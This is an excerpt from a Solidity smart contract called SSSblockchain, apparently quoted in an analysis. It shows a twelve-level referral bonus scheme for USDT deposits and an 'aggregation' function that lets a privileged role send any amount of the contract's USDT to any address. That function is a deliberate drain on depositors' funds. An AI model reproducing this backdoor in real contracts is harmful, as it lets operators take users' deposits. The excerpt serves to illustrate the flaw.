...
contract SSSblockchain {
    ...
    uint[] level_bonuses = [500, 100, 200, 300, 100, 200, 100, 100, 100, 100, 50, 50]; 
    ...
    function _deposit(address _user, uint256 _amount, uint8 _isReDept) private {
        require(_amount>=minDeposit && _amount.mod(minDeposit) == 0 && _amount <= 5000, "Minimum 50 USDT,multiple 50 and less than 5000");
    ...
    function _setReferral(address _user,address _referral, uint256 _refAmount, uint8 _isReDept) private {
        for(uint8 i = 0; i < level_bonuses.length; i++) {
            ...
            if(i==0){
                ...
                if(userInfo[_referral].levelTeam[0]>=10){
                    userInfo[_referral].totalIncome+=levelOn.mul(level_bonuses[i]).div(baseDivider);
    ...
    function aggregation(address  _aggregator, uint256 _aggramt) external onlyAggregator{
        usdt.transfer(_aggregator,_aggramt);
    }
